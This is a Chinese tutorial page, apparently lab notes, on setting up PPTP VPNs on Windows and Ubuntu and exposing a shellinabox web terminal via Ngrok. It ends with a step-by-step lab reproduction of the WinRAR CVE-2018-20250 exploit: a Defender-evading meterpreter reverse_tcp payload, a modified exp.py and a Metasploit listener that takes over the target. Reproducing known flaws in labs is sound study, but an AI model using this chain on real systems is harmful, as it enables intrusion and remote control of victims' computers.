windows系统架设VPN服务器

windows系统架设VPN服务器

一、架设VPN服务器的具体步骤：

1.打开“打开网络和共享中心”，再选择“更改适配器设置”。然后在“菜单栏”(如果没有看到菜单栏，请按下键盘上的Alt按键，即可显示菜单栏)点击“文件”，选择“新建传入连接”。出现下图所示界面：

2.勾选选择允许使用VPN连接到本机的用户，选择用户后点击下一步，在弹出窗口选择“通过Internet”。

3.接着设置网络参数，如果对方连接后可以使用本地网络的DHCP服务器，那么可以跳过此设置。如果本地网络没有DHCP服务器，必须设置一下，请点击“Internet 协议版本 4(TCP/IP)”， 点“属性”按钮，选择“指定IP地址”，设置一个没有被使用的IP段，设置后请按确定，然后点击“允许访问”。

4.出现如下窗口，安装成功

二、创建VPN连接

1.在另一台计算机操作系统的桌面找到网络，点开其属性，在打开的页面点设置新的连接或网络；

2.在设置连接或网络页面点连接到工作区，点下一步

3.在连接到工作区页面点使用我的Internet连接VPN

4.输入Internet地址后点击下一步

5.输入用户名和密码，然后按连接；

6.连接成功后，我们就成功地在操作系统中创建了VPN连接

Ubuntu上搭建VPN

在Ubuntu上搭建VPN常见的三种方法分别是PPTP,L2TP/IPsec，OpenVPN。这里使用PPTP安装。

安装流程：

1.安装pptpd

输入命令sudo apt-get install pptpd对pptpd进行安装

2.配置pptpd

修改pptpd.conf配置文件信息

sudo gedit /etc/pptpd.conf 进入文字编辑页面，在文件末尾找到#localip 192.168.0.1和#remoteip 192.168.0.234-238,192.168.0.245去掉前面的注释改为localip 192.168.0.1和remoteip 192.168.0.234-238,192.168.0.245其中localip是指本机IP,这个IP不是指公网IP也不是局域网IP.代表的是VPN服务器的ip地址。remoteip是客户端连接后分配的ip地址。

3.添加VPN用户账号

sudo vim /etc/ppp/chap-secrets 打开文件以后，看见：

# Secrets for authentication using CHAP

# client server secret IP addresses

client代表用户名，server代表使用的VPN服务类型， secret代表用户登录的密码，IP address代表可以可以登录连接的IP

在其下面分别输入： 用户名 pptpd 密码 *

4.设置VPN的ms-dns

sudo gedit /etc/ppp/pptpd-options 打开文件找到：#ms-dns 10.0.0.1和#ms-dns 10.0.0.1去掉注释，修改为8.8.8.8、8.8.4.4或者你其它的DNS服务器；如：ms-dns 8.8.8.8和ms-dns 8.8.4.4

5.开启内核IP转发

sudo gedit /etc/sysctl.conf

在打开的文档中找到

#net.ipv4.ip_forward=1

去掉注释

net.ipv4.ip_forward=1

保存以后，输入命令，使修改及时生效

sudo sysctl -p

6.安装配置iptables

（1）sudo apt-get install iptables命令安装iptables

安装后清除iptables里旧的规则

sudo iptables -F

sudo iptables -X

sudo iptables -t nat -F

sudo iptables -t nat -X

（2）允许gre协议以及1723端口、47端口

sudo iptables -A INPUT -p gre -j ACCEPT

sudo iptables -A INPUT -p tcp –dport 1723 -j ACCEPT

sudo iptables -A INPUT -p tcp –dport 47 -j ACCEPT

（3）开启NAT转发

sudo iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -o eth0 -j MASQUERADE

（4）保存iptables规则

sudo iptables-save > /etc/iptables-rules

打卡网卡配置文件

sudo gedit /etc/network/interfaces

在文件末尾添加

pre-up iptables-restore < /etc/iptables-rules

7.重启pptpd服务

sudo service pptpd restart

查看端口1723是否被启用

Windows上连接

1，打开网络共享中心

2，点击设置新的连接或网络，在弹出窗口点击连接到工作区

3，点击使用我的Internet连接VPN

4，输入VPN服务器地址

5，输入VPN登录用户名密码，点击连接，点击跳过，最后关闭

6，连接网络，可以连接，安装成功。

Kali使用shellinabox，并使用Ngrok将shellinabox映射到外网

​ Shellinabox 是一个利用 Ajax 技术构建的基于 Web 浏览器的远程终端模拟器，安装该软件后，服务器端不需要开启 ssh服务，通过 Web 浏览器就可以对远程主机进行操作。使用来登录到系统http://IP:4200，在启用了SSL/TLS证书，需要用http://IP:4200来登录。默认情况下shellinabox使用的是4200端口。

1.安装shellinabox

​ 打开kali系统并在终端输入命令apt install shellinabox对shellinabox进行安装，若无法找到包，请更新源后再继续安装。

2.运行shellinabox

​ 输入命令shellinaboxd -b -t运行shellinabox，启动服务之后，在浏览器访问http://IP:4200，且shellinabox默认禁止root登陆，所以Kali系统需要新建一个普通用户登录

3.使用Ngrok将服务映射到外网

​ （1）在Ngrok建立隧道，注意本地端口填写启动shellinabox的端口

​ （2）下载客户端，并在KALI环境中解压，执行命令./sunny clientid 隧道id开启映射

4.通过外网登陆

在浏览器中直接输入URL即可登录

WebRAR目录穿越漏洞复现

\1. 使用Metasploit生成Payload

（1）在kali Linux环境中打开终端并且输入msfconsole命令启动Metasploit

（2）在Metasploit中输入命令use evasion/windows/windows_defender_exe进行操作对象切换，再输入命令show info 查看详细信息。

​ 再输入命令set filename WinRAR.exe和命令 set payload windows/meterprerer/reverse_tcp

之后输入show options查看配置

（3）使用命令set lhost +kali的IP地址和命令set lport +端口号对IP地址和端口进行修改

修改后输入命令run运行

输入show options进行查看，如下图所示：

（4）输入命令exit退出Metasploit

\1. 生成恶意程序

（1）cd /root/Desktop

git clone https://github.com/WyAtu/CVE-2018-20250.git

下载exp

（2）cd CVE-2018-20250切换页面CVE-2018-20250

cp /root/.msf4/local/WinRAR.exe ./ 复制文件
vim exp.py进行编辑，将exp.py中的evil_filename = “calc.exe”改为”WinRAR.exe”

（3）将CVE-2018-20250文件夹复制到Windows10中

执行python exp.py命令，生成恶意程序test.rar

3.将test.rar复制到Windows7上，解压

4.在kali中使用Metasploit对靶机进行监听

在kali 中输入以下命令

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
show options
set lhost +kali所在ip地址
set lport +自己所设端口
run

\5. 在靶机上运行所生成的恶意程序

在解压的文件夹中选择hi.exe文件，让它运行，此时kali 终端会收到会话，获取了靶机的权限。
